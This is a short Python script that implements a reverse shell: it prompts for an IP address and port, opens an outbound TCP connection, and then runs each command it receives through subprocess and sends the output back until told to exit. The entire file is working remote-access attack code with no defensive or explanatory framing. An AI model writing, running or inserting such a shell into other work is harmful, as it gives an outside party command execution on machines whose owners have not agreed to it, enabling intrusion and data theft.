import subprocess
import socket

def reverse_shell():
    IP = input("Enter your ip: ")
    PORT = int(input("Enter your port: "))
    
    # Trying to connect to the machine
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        s.connect((IP, PORT))

        # Sends connection confirmation message
        s.send(b"Connection established!\n")

        # Keeps the connection open
        while True:
            command = s.recv(1024).decode()
            if "exit" in command:
               break
            output = subprocess.getoutput(command)
            s.send(output.encode())     
    except Exception as e:
        print(f"Error connecting: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()